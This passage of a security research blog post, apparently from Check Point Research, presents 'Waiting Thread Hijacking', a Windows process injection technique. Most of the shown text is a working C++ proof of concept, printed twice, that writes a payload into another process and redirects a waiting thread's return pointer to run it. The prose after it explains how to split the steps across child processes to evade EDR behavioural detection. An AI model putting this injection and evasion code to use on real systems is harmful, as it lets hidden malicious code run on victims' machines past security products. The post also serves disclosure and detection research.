"</span><span class="enlighter-text"> </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> suitable_ret </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">" with: "</span><span class="enlighter-text"> </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> shellcodePtr </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> std::endl;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">ntapi::</span><span class="enlighter-m0">WriteProcessMemory</span><span class="enlighter-g1">(</span><span class="enlighter-text">hProcess, </span><span class="enlighter-g1">(</span><span class="enlighter-text">LPVOID</span><span class="enlighter-g1">)</span><span class="enlighter-text">suitable_ret_ptr, &amp;shellcodePtr, </span><span class="enlighter-k3">sizeof</span><span class="enlighter-g1">(</span><span class="enlighter-text">shellcodePtr</span><span class="enlighter-g1">)</span><span class="enlighter-text">, &amp;written</span><span class="enlighter-g1">)</span><span class="enlighter-text"> &amp;&amp; written == </span><span class="enlighter-k3">sizeof</span><span class="enlighter-g1">(</span><span class="enlighter-text">shellcodePtr</span><span class="enlighter-g1">))</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            std::cout </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">"Ret overwritten!\n"</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">            is_injected = </span><span class="enlighter-e0">true</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">CloseHandle</span><span class="enlighter-g1">(</span><span class="enlighter-text">hProcess</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k0">return</span><span class="enlighter-text"> is_injected;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k5">bool</span><span class="enlighter-text"> </span><span class="enlighter-m0">execute_injection</span><span class="enlighter-g1">(</span><span class="enlighter-text">DWORD processID</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    LPVOID shellcodePtr = </span><span class="enlighter-e1">NULL</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        HANDLE hProcess = </span><span class="enlighter-m0">OpenProcess</span><span class="enlighter-g1">(</span><span class="enlighter-text">PROCESS_VM_OPERATION, </span><span class="enlighter-e0">FALSE</span><span class="enlighter-text">, processID</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">!hProcess</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-k0">return</span><span class="enlighter-text"> </span><span class="enlighter-e0">false</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        shellcodePtr = ntapi::</span><span class="enlighter-m0">VirtualAllocEx</span><span class="enlighter-g1">(</span><span class="enlighter-text">hProcess, </span><span class="enlighter-k0">nullptr</span><span class="enlighter-text">, </span><span class="enlighter-k3">sizeof</span><span class="enlighter-g1">(</span><span class="enlighter-text">g_payload</span><span class="enlighter-g1">)</span><span class="enlighter-text">, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-m0">CloseHandle</span><span class="enlighter-g1">(</span><span class="enlighter-text">hProcess</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">!shellcodePtr</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-k0">return</span><span class="enlighter-text"> </span><span class="enlighter-e0">false</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        HANDLE hProcess = </span><span class="enlighter-m0">OpenProcess</span><span class="enlighter-g1">(</span><span class="enlighter-text">PROCESS_VM_OPERATION | PROCESS_VM_WRITE, </span><span class="enlighter-e0">FALSE</span><span class="enlighter-text">, processID</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">!hProcess</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-k0">return</span><span class="enlighter-text"> </span><span class="enlighter-e0">false</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        SIZE_T written = 0;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k5">bool</span><span class="enlighter-text"> isOk = ntapi::</span><span class="enlighter-m0">WriteProcessMemory</span><span class="enlighter-g1">(</span><span class="enlighter-text">hProcess, </span><span class="enlighter-g1">(</span><span class="enlighter-text">LPVOID</span><span class="enlighter-g1">)</span><span class="enlighter-text">shellcodePtr, g_payload, </span><span class="enlighter-k3">sizeof</span><span class="enlighter-g1">(</span><span class="enlighter-text">g_payload</span><span class="enlighter-g1">)</span><span class="enlighter-text">, &amp;written</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-m0">CloseHandle</span><span class="enlighter-g1">(</span><span class="enlighter-text">hProcess</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">!isOk</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-k0">return</span><span class="enlighter-text"> </span><span class="enlighter-e0">false</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k0">return</span><span class="enlighter-text"> </span><span class="enlighter-m0">run_injected</span><span class="enlighter-g1">(</span><span class="enlighter-text">processID, </span><span class="enlighter-g1">(</span><span class="enlighter-text">ULONG_PTR</span><span class="enlighter-g1">)</span><span class="enlighter-text">shellcodePtr, WrQueue</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span></div></div></div><div class="enlighter-raw">bool check_ret_target(LPVOID ret)
{
    HMODULE mod = get_module_by_address((LPVOID)ret);
    if (mod == NULL) {
        std::cout &lt;&lt; "Pointer not in any recognized module.\n";
        return false;
    }
    if (mod == GetModuleHandleA("ntdll.dll") || 
        mod == GetModuleHandleA("kernelbase.dll") || 
        mod == GetModuleHandleA("kernel32.dll"))
    {
        return true;
    }
    std::cout &lt;&lt; "Pointer not in ntdll/kernel32.\n";
    return false;
}

bool run_injected(DWORD pid, ULONGLONG shellcodePtr, KWAIT_REASON wait_reason)
{
    std::cout &lt;&lt; "Enumerating threads of PID: " &lt;&lt; pid &lt;&lt; "\n";
    std::map&lt;DWORD, thread_info&gt; threads_info;
    if (!pesieve::util::fetch_threads_info(pid, threads_info)) {
        return false;
    }

    HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, pid);
    if (!hProcess) return false;

    CONTEXT ctx = { 0 };
    ULONGLONG suitable_ret_ptr = 0;
    ULONGLONG suitable_ret = 0;
    std::cout &lt;&lt; "Threads: " &lt;&lt; threads_info.size() &lt;&lt; std::endl;
    for (auto itr = threads_info.begin(); itr != threads_info.end(); ++itr) {
        thread_info&amp; info = itr-&gt;second;

        if (!info.is_extended) return false;
        
        if (info.ext.state == Waiting) {
            std::cout &lt;&lt; "TID: " &lt;&lt; info.tid &lt;&lt; std::hex &lt;&lt; " : wait reason: " &lt;&lt; std::dec &lt;&lt; info.ext.wait_reason &lt;&lt; "\n";
            if (info.ext.wait_reason != wait_reason || !read_context(info.tid, ctx)) {
                continue;
            }
            ULONGLONG ret = read_return_ptr&lt;ULONGLONG&gt;(hProcess, ctx.Rsp);
            std::cout &lt;&lt; "RET: " &lt;&lt; std::hex &lt;&lt; ret &lt;&lt; "\n";
            if (!suitable_ret_ptr) {
                if (!check_ret_target((LPVOID)ret)) {
                    std::cout &lt;&lt; "Not supported ret target. Skipping!\n";
                    continue;
                }
                suitable_ret_ptr = ctx.Rsp;
                suitable_ret = ret;
                std::cout &lt;&lt; "\tUsing as a target!\n";
                break; 
            }
        }
        else {
            std::cout &lt;&lt; "TID: " &lt;&lt; itr-&gt;first &lt;&lt; "is NOT waiting, State: " &lt;&lt; info.ext.state &lt;&lt; "\n";
        }
    }
    bool is_injected = false;
    if (suitable_ret_ptr) {
        // overwrite the shellcode with the jump back
        SIZE_T written = 0;
        if (ntapi::WriteProcessMemory(hProcess, (LPVOID)shellcodePtr, &amp;suitable_ret, sizeof(suitable_ret), &amp;written) &amp;&amp; written == sizeof(suitable_ret)) {
            std::cout &lt;&lt; "Shellcode ptr overwritten! Written: " &lt;&lt; written &lt;&lt; " \n";
        }
        else {
            std::cout &lt;&lt; "Failed to overwrite shellcode jmp back: " &lt;&lt; std::hex &lt;&lt; GetLastError() &lt;&lt; "\n";
            return false;
        }
        if (!protect_memory(pid, (LPVOID)shellcodePtr, sizeof(g_payload), PAGE_EXECUTE_READ)) {
            std::cerr &lt;&lt; "Failed making memory executable!\n";
            return false;
        }

        shellcodePtr += 0x8; // after the saved return...
        std::cout &lt;&lt; "Trying to overwrite: " &lt;&lt; std::hex &lt;&lt; suitable_ret_ptr &lt;&lt; " -&gt; " &lt;&lt; suitable_ret &lt;&lt; " with: " &lt;&lt; shellcodePtr &lt;&lt; std::endl;
        if (ntapi::WriteProcessMemory(hProcess, (LPVOID)suitable_ret_ptr, &amp;shellcodePtr, sizeof(shellcodePtr), &amp;written) &amp;&amp; written == sizeof(shellcodePtr)) {
            std::cout &lt;&lt; "Ret overwritten!\n";
            is_injected = true;
        }
    }
    CloseHandle(hProcess);
    return is_injected;
}

bool execute_injection(DWORD processID)
{
    LPVOID shellcodePtr = NULL;

    {
        HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION, FALSE, processID);
        if (!hProcess) return false;

        shellcodePtr = ntapi::VirtualAllocEx(hProcess, nullptr, sizeof(g_payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        CloseHandle(hProcess);
        if (!shellcodePtr) return false;
    }

    {
        HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, processID);
        if (!hProcess) return false;

        SIZE_T written = 0;
        bool isOk = ntapi::WriteProcessMemory(hProcess, (LPVOID)shellcodePtr, g_payload, sizeof(g_payload), &amp;written);
        CloseHandle(hProcess);
        if (!isOk) return false;
    }
    return run_injected(processID, (ULONG_PTR)shellcodePtr, WrQueue);
}</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">bool check_ret_target(LPVOID ret)
{
    HMODULE mod = get_module_by_address((LPVOID)ret);
    if (mod == NULL) {
        std::cout &lt;&lt; "Pointer not in any recognized module.\n";
        return false;
    }
    if (mod == GetModuleHandleA("ntdll.dll") || 
        mod == GetModuleHandleA("kernelbase.dll") || 
        mod == GetModuleHandleA("kernel32.dll"))
    {
        return true;
    }
    std::cout &lt;&lt; "Pointer not in ntdll/kernel32.\n";
    return false;
}

bool run_injected(DWORD pid, ULONGLONG shellcodePtr, KWAIT_REASON wait_reason)
{
    std::cout &lt;&lt; "Enumerating threads of PID: " &lt;&lt; pid &lt;&lt; "\n";
    std::map&lt;DWORD, thread_info&gt; threads_info;
    if (!pesieve::util::fetch_threads_info(pid, threads_info)) {
        return false;
    }

    HANDLE hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, pid);
    if (!hProcess) return false;

    CONTEXT ctx = { 0 };
    ULONGLONG suitable_ret_ptr = 0;
    ULONGLONG suitable_ret = 0;
    std::cout &lt;&lt; "Threads: " &lt;&lt; threads_info.size() &lt;&lt; std::endl;
    for (auto itr = threads_info.begin(); itr != threads_info.end(); ++itr) {
        thread_info&amp; info = itr-&gt;second;

        if (!info.is_extended) return false;
        
        if (info.ext.state == Waiting) {
            std::cout &lt;&lt; "TID: " &lt;&lt; info.tid &lt;&lt; std::hex &lt;&lt; " : wait reason: " &lt;&lt; std::dec &lt;&lt; info.ext.wait_reason &lt;&lt; "\n";
            if (info.ext.wait_reason != wait_reason || !read_context(info.tid, ctx)) {
                continue;
            }
            ULONGLONG ret = read_return_ptr&lt;ULONGLONG&gt;(hProcess, ctx.Rsp);
            std::cout &lt;&lt; "RET: " &lt;&lt; std::hex &lt;&lt; ret &lt;&lt; "\n";
            if (!suitable_ret_ptr) {
                if (!check_ret_target((LPVOID)ret)) {
                    std::cout &lt;&lt; "Not supported ret target. Skipping!\n";
                    continue;
                }
                suitable_ret_ptr = ctx.Rsp;
                suitable_ret = ret;
                std::cout &lt;&lt; "\tUsing as a target!\n";
                break; 
            }
        }
        else {
            std::cout &lt;&lt; "TID: " &lt;&lt; itr-&gt;first &lt;&lt; "is NOT waiting, State: " &lt;&lt; info.ext.state &lt;&lt; "\n";
        }
    }
    bool is_injected = false;
    if (suitable_ret_ptr) {
        // overwrite the shellcode with the jump back
        SIZE_T written = 0;
        if (ntapi::WriteProcessMemory(hProcess, (LPVOID)shellcodePtr, &amp;suitable_ret, sizeof(suitable_ret), &amp;written) &amp;&amp; written == sizeof(suitable_ret)) {
            std::cout &lt;&lt; "Shellcode ptr overwritten! Written: " &lt;&lt; written &lt;&lt; " \n";
        }
        else {
            std::cout &lt;&lt; "Failed to overwrite shellcode jmp back: " &lt;&lt; std::hex &lt;&lt; GetLastError() &lt;&lt; "\n";
            return false;
        }
        if (!protect_memory(pid, (LPVOID)shellcodePtr, sizeof(g_payload), PAGE_EXECUTE_READ)) {
            std::cerr &lt;&lt; "Failed making memory executable!\n";
            return false;
        }

        shellcodePtr += 0x8; // after the saved return...
        std::cout &lt;&lt; "Trying to overwrite: " &lt;&lt; std::hex &lt;&lt; suitable_ret_ptr &lt;&lt; " -&gt; " &lt;&lt; suitable_ret &lt;&lt; " with: " &lt;&lt; shellcodePtr &lt;&lt; std::endl;
        if (ntapi::WriteProcessMemory(hProcess, (LPVOID)suitable_ret_ptr, &amp;shellcodePtr, sizeof(shellcodePtr), &amp;written) &amp;&amp; written == sizeof(shellcodePtr)) {
            std::cout &lt;&lt; "Ret overwritten!\n";
            is_injected = true;
        }
    }
    CloseHandle(hProcess);
    return is_injected;
}

bool execute_injection(DWORD processID)
{
    LPVOID shellcodePtr = NULL;

    {
        HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION, FALSE, processID);
        if (!hProcess) return false;

        shellcodePtr = ntapi::VirtualAllocEx(hProcess, nullptr, sizeof(g_payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        CloseHandle(hProcess);
        if (!shellcodePtr) return false;
    }

    {
        HANDLE hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, processID);
        if (!hProcess) return false;

        SIZE_T written = 0;
        bool isOk = ntapi::WriteProcessMemory(hProcess, (LPVOID)shellcodePtr, g_payload, sizeof(g_payload), &amp;written);
        CloseHandle(hProcess);
        if (!isOk) return false;
    }
    return run_injected(processID, (ULONG_PTR)shellcodePtr, WrQueue);
}</pre>



<p class="wp-block-paragraph">The complete source code of the&nbsp;<a href="https://github.com/hasherezade/waiting_thread_hijacking">PoC is available on GitHub</a>.</p>



<h1 class="wp-block-heading" id="demo">Demo</h1>



<p class="wp-block-paragraph">Demo on Windows 11 24H2</p>



<figure class="wp-block-embed aligncenter is-type-video is-provider-youtube wp-block-embed-youtube wp-embed-aspect-16-9 wp-has-aspect-ratio"><div class="wp-block-embed__wrapper">
<div loading="lazy" title="[DEMO] Waiting Thread Hijacking (on Windows 11 24 H2)" width="800" height="450" src="cid:frame-6381DDBF867124EFF468E449850F8844@mhtml.blink" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen="" data-original-tag="iframe"></div>
</div></figure>



<p class="wp-block-paragraph">Source code:</p>



<p class="wp-block-paragraph"><a href="https://github.com/hasherezade/waiting_thread_hijacking">https://github.com/hasherezade/waiting_thread_hijacking</a></p>



<h1 class="wp-block-heading" id="execution-flow-obfuscation">Execution flow obfuscation</h1>



<p class="wp-block-paragraph">Some products base their detection on behavioral signatures, which consist of sequences of API calls made in conjunction. While a single write done to a remote process might get a pass, if the same process makes other interesting calls, it may create a marker of an injection technique.</p>



<p class="wp-block-paragraph">One way to throw off process-centric behavioral signatures is to apply a simple obfuscation and split each step of our technique into a different child process.</p>



<p class="wp-block-paragraph">In this model, allocation with read-write access is executed by the first process. The allocated address is then stored in an environment variable and passed to the next child process, which fills the new memory area with content. Then, the final child process changes the access rights of the allocated memory to read-execute. The last child process replaces the return pointer of the waiting thread, redirecting it to the previously written shellcode.</p>



<p class="wp-block-paragraph">We can also split the execution into three steps instead of four, if we’re willing to accept a small concurrency risk. Using Waiting Thread Hijacking, the execution of the implant is not instantaneous and instead depends on a received event. So, making the shellcode executable can be done as the last step, after the pointer on the stack was already replaced.</p>



<p class="wp-block-paragraph">A demo enriched with this obfuscation method is available when compiling the PoC with a flag:&nbsp;<code>SPLIT_STEPS</code>.</p>



<h1 class="wp-block-heading" id="conclusion">Conclusion</h1>



<p class="wp-block-paragraph">Waiting Thread Hijacking relies on writing to a remote process. However, some Endpoint Detection and Response (EDR) systems may prevent any attempt at remote write, effectively thwarting this technique.</p>



<p class="wp-block-paragraph">To overcome these limitations, it would be best to use an unconventional write (as demonstrated in the blog about Thread Name-Calling). But here comes the chicken-and-egg problem: to do so, we need to execute remotely some API. So, it defeats the purpose of this technique, which is stealthy execution. Techniques like&nbsp;<a href="https://undev.ninja/nina-x64-process-injection/">NINA</a>&nbsp;and&nbsp;<a href="https://blog.sevagas.com/IMG/pdf/code_injection_series_part5.pdf">GhostWriting</a>&nbsp;try to solve the write problem without using APCs (Asynchronous Procedure Calls), but they come with their own trade-offs. For example, they make use of&nbsp;<a href="https://medium.com/tenable-techblog/api-series-setthreadcontext-d08c9f84458d">SetThreadContext</a>, which is still detectable and blocked by many EDR systems.</p>



<p class="wp-block-paragraph">On the other hand, there are some products that are very restrictive about remote execution methods but more lenient about allocations and writes. In such cases, WTH can still be effective in hiding the point at which the implanted code was run, remaining undetected despite using a common write primitive.</p>



<p class="wp-block-paragraph">Different EDRs have different mechanisms of working, and by diversifying the arsenal of techniques, we can increase our success ratio in Red Teaming endeavors. Using WTH we were able to bypass some EDRs that stopped Thread Name-Calling. However, the opposite effect also occurred. No injection technique is perfect; each has its pros and cons, and as always, we are forced to trade off one suspicious indicator against another.</p>



<p class="wp-block-paragraph">This technique doesn’t use rare APIs or sophisticated structures. Thanks to this simplicity, it’s easy to implement, but harder to detect by statically analyzing the sample, i.e.&nbsp;using YARA rules. All used APIs occur commonly in benign executables as well. The best way to catch it is by watching behavior, stopping remote writes immediately, or examining where they lead.</p>



<p class="wp-block-paragraph"><em><strong>Check Point customers remain protected from the threats described in this research.</strong></em></p>



<p class="wp-block-paragraph"><em><strong>Check Point’s&nbsp;<a href="https://www.checkpoint.com/harmony/advanced-endpoint-protection/">Harmony Endpoint</a>&nbsp;provides comprehensive endpoint protection at the highest security level, crucial to avoid security breaches and data compromise. Behavioral Guard protections were developed and deployed to protect customers against the threats described in this research.</strong></em></p>



<p class="wp-block-paragraph"><strong>Harmony Endpoint protections:</strong></p>



<p class="wp-block-paragraph"><em>WaitingThreadHijackBlock</em></p>



<h1 class="wp-block-heading" id="references">References</h1>



<p class="wp-block-paragraph">Compendiums of known process injection techniques:</p>



<ul class="wp-block-list">
<li><a href="https://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All-wp.pdf" target="_blank" rel="noreferrer noopener">https://i.blackhat.com/USA-19/Thursday/us-19-Kotler-Process-Injection-Techniques-Gotta-Catch-Them-All-wp.pdf</a></li>



<li><a href="https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process" target="_blank" rel="noreferrer noopener">https://www.elastic.co/blog/ten-process-injection-techniques-technical-survey-common-and-trending-process</a></li>



<li><a href="https://attack.mitre.org/techniques/T1055/" target="_blank" rel="noreferrer noopener">https://attack.mitre.org/techniques/T1055/</a></li>



<li><a href="https://www.ired.team/offensive-security/code-injection-process-injection" target="_blank" rel="noreferrer noopener">https://www.ired.team/offensive-security/code-injection-process-injection</a></li>
</ul>



<p class="wp-block-paragraph">On Classic Thread Hijacking:</p>



<ul class="wp-block-list">
<li><a href="https://www.ired.team/offensive-security/code-injection-process-injection/injecting-to-remote-process-via-thread-hijacking" target="_blank" rel="noreferrer noopener">https://www.ired.team/offensive-security/code-injection-process-injection/injecting-to-remote-process-via-thread-hijacking</a></li>
</ul>



<p class="wp-block-paragraph">On derivatives of Thread Hijacking:</p>



<ul class="wp-block-list">
<li><a href="https://infosecwriteups.com/t-rop-h-thread-hijacking-without-executable-memory-allocation-d746c102a9ca" target="_blank" rel="noreferrer noopener">https://infosecwriteups.com/t-rop-h-thread-hijacking-without-executable-memory-allocation-d746c102a9ca</a></li>
</ul>



<p class="wp-block-paragraph">On SetThreadContext and the alerts that it triggers:</p>



<ul class="wp-block-list">
<li><a href="https://medium.com/tenable-techblog/api-series-setthreadcontext-d08c9f84458d">https://medium.com/tenable-techblog/api-series-setthreadcontext-d08c9f84458d</a></li>
</ul>



<p class="wp-block-paragraph">On Waiting Threads and Thread Pool:</p>



<ul class="wp-block-list">
<li><a href="https://scorpiosoftware.net/2022/03/21/threads-threads-and-more-threads/" target="_blank" rel="noreferrer noopener">https://scorpiosoftware.net/2022/03/21/threads-threads-and-more-threads/</a></li>



<li><a href="https://learn.microsoft.com/en-us/windows/win32/procthread/thread-pools" target="_blank" rel="noreferrer noopener">https://learn.microsoft.com/en-us/windows/win32/procthread/thread-pools</a></li>



<li><a href="https://www.microsoftpressstore.com/articles/article.aspx?p=2233328&amp;seqNum=6" target="_blank" rel="noreferrer noopener">https://www.microsoftpressstore.com/articles/article.aspx?p=2233328&amp;seqNum=6</a></li>
</ul>



<p class="wp-block-paragraph">Using Thread Pool for injections:</p>



<ul class="wp-block-list">
<li><a href="https://www.safebreach.com/blog/process-injection-using-windows-thread-pools/" target="_blank" rel="noreferrer noopener">https://www.safebreach.com/blog/process-injection-using-windows-thread-pools/</a></li>



<li><a href="https://i.blackhat.com/EU-23/Presentations/EU-23-Leviev-The-Pool-Party-You-Will-Never-Forget.pdf" target="_blank" rel="noreferrer noopener">https://i.blackhat.com/EU-23/Presentations/EU-23-Leviev-The-Pool-Party-You-Will-Never-Forget.pdf</a></li>



<li><a href="https://vvinoth.com/post/threadpools/" target="_blank" rel="noreferrer noopener">https://vvinoth.com/post/threadpools/</a></li>
</ul>



<p class="wp-block-paragraph">Another technique taking advantage of waiting threads:</p>



<ul class="wp-block-list">
<li><a href="https://www.unknowncheats.me/forum/anti-cheat-bypass/261176-silentjack-ultimate-handle-hijacking-user-mode-multi-ac-bypass-eac-tested.html" target="_blank" rel="noreferrer noopener">https://www.unknowncheats.me/forum/anti-cheat-bypass/261176-silentjack-ultimate-handle-hijacking-user-mode-multi-ac-bypass-eac-tested.html</a></li>
</ul>



<p class="wp-block-paragraph"></p>
					</div>			
				</div>
				 
				<div class="back-to-top">
					<a href="https://research.checkpoint.com/2025/waiting-thread-hijacking/#single-post">
										<div class="image center">
						<img src="https://research.checkpoint.com/wp-content/uploads/2022/10/back_arrow.svg" alt="" width="300" height="150">
					</div>
										
											GO UP							
					</a>
				</div>
										<div class="button-wrap center">
						<a class="button background-skyblue font-white skyblue-border" href="https://research.checkpoint.com/latest-publications/">BACK TO ALL POSTS</a>
					</div>
						

			</div>
			 
				<div class="flex-4">
					
<div class="sidebar-post-wrapper">
		<div class="sidebar-post-inner">
					</div>
				<div class="sidebar-post-categories popular">
				<div class="aside-box">
					<h2>POPULAR POSTS</h2>
				<div class="blog-most-popular font-white">
									<div class="blog-most-popular-row relative">
										<a class="background-image" href="https://research.checkpoint.com/2023/opwnai-cybercriminals-starting-to-use-chatgpt/" style="background-image: url(https://research.checkpoint.com/wp-content/uploads/2023/01/AI-1059x529-copy.jpg);">
						<img src="https://research.checkpoint.com/wp-content/uploads/2023/01/AI-1059x529-copy.jpg" alt="">						</a>
								<div class="title">
					<ul class="top-content category-wraper">
													<li>Artificial Intelligence</li>													<li>ChatGPT</li>													<li>Check Point Research Publications</li>											</ul>
					<a href="https://research.checkpoint.com/2023/opwnai-cybercriminals-starting-to-use-chatgpt/">OPWNAI : Cybercriminals Starting to Use ChatGPT</a>
				</div>
			</div>
									<div class="blog-most-popular-row relative">
										<a class="background-image" href="https://research.checkpoint.com/2019/hacking-fortnite/" style="background-image: url(https://research.checkpoint.com/wp-content/uploads/2019/01/Fortnite_1021x580.jpg);">
						<img src="https://research.checkpoint.com/wp-content/uploads/2019/01/Fortnite_1021x580.jpg" alt="">						</a>
								<div class="title">
					<ul class="top-content category-wraper">
													<li>Check Point Research Publications</li>													<li>Threat Research</li>											</ul>
					<a href="https://research.checkpoint.com/2019/hacking-fortnite/">Hacking Fortnite Accounts</a>
				</div>
			</div>
									<div class="blog-most-popular-row relative">
										<a class="background-image" href="https://research.checkpoint.com/2022/opwnai-ai-that-can-save-the-day-or-hack-it-away/" style="background-image: url(https://research.checkpoint.com/wp-content/uploads/2022/12/OpenAIchatGPT_header.jpg);">
						<img src="https://research.checkpoint.com/wp-content/uploads/2022/12/OpenAIchatGPT_header.jpg" alt="">						</a>
								<div class="title">
					<ul class="top-content category-wraper">
													<li>Artificial Intelligence</li>													<li>ChatGPT</li>													<li>Check Point Research Publications</li>											</ul>
					<a href="https://research.checkpoint.com/2022/opwnai-ai-that-can-save-the-day-or-hack-it-away/">OpwnAI: AI That Can Save the Day or HACK it Away</a>
				</div>
			</div>
					</div>
	</div>
		</div>
		</div>  
				</div>
						
		</div>
	</div>
		
		 

<div class="aside-box">
	<div class="container container-wide">
	<div class="text font-blue-- section-title">
		<h3>BLOGS AND PUBLICATIONS</h3>
	</div>
	</div>
					<div class="blog-most-recent font-white slick-initialized slick-slider slick-dotted" role="toolbar">
														<div aria-live="polite" class="slick-list draggable" style="padding: 0px 30px; height: 164.438px;"><div class="slick-track" role="listbox" style="opacity: 1; width: 15000px; transform: translate3d(-196px, 0px, 0px);"><div class="blog-slide slick-slide slick-cloned" data-slick-index="-2" id="" aria-hidden="true" tabindex="-1">
						<div class="box relative">
														<a class="image background-image--" href="https://research.checkpoint.com/2017/the-next-wannacry-vulnerability-is-here/" style="background-image: url('https://research.checkpoint.com/wp-content/uploads/2017/08/WannaCry-Post-No-Image-1021x450.jpg')" tabindex="-1">
								<img src="https://research.checkpoint.com/wp-content/uploads/2017/08/WannaCry-Post-No-Image-1021x450.jpg" alt="">
							</a>
							<ul class="top-content category-wraper">
																	<li>Check Point Research Publications</li>															</ul>
							<div class="text">
								<span class="date small-font">August 11, 2017</span>
								<h3>“The Next WannaCry” Vulnerability is Here</h3>
							</div>
						</div>
					</div><div class="blog-slide slick-slide slick-cloned" data-slick-index="-1" id="" aria-hidden="true" tabindex="-1">
						<div class="box relative">
														<a class="image background-image--" href="https://research.checkpoint.com/2018/rubyminer-cryptominer-affects-30-ww-networks/" style="background-image: url('https://research.checkpoint.com/wp-content/uploads/2018/01/rubyminer.jpg')" tabindex="-1">
								<img src="https://research.checkpoint.com/wp-content/uploads/2018/01/rubyminer.jpg" alt="">
							</a>
							<ul class="top-content category-wraper">
																	<li>Check Point Research Publications</li>															</ul>
							<div class="text">
								<span class="date small-font">January 11, 2018</span>
								<h3>‘RubyMiner’ Cryptominer Affects 30% of WW Networks</h3>
							</div>
						</div>
					</div><div class="blog-slide slick-slide slick-current slick-active slick-center" data-slick-index="0" aria-hidden="false" tabindex="-1" role="option" aria-describedby="slick-slide00">
						<div class="box relative">
